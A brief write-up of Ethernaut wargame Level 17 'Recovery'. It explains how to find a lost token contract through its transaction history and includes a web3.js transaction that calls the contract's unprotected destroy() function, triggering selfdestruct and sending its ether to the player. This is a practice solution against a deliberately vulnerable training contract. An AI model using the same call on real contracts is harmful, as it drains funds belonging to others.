# Level 17: [Recovery](https://ethernaut.openzeppelin.com/level/0xb4B157C7c4b0921065Dded675dFe10759EecaA6D)

## Level objectives:
Recover (or remove) the 0.001 ether from the lost contract address.
## Analysis (lol)
- The token contract has a destroy function that triggers it's own `selfdestruct` and sends ether to the `_to` address param.
- The contract we're handed by ethernaut is the `Recovery`, not the token contract.
- Find the token contract address by following the tx chain on etherscan then trigger it's `destroy()` function.

## Code:
```js
web3.eth.sendTransaction({
  from: "0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4",
  to: "0xe3B00d0d367f96a1eaC69C866e58680A7161c795",
  data: web3.eth.abi.encodeFunctionCall({
    name: 'destroy',
    type: 'function',
    inputs: [{
      name: "_to",
      type: "address",
    }],
  }, ["0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4"])
});
```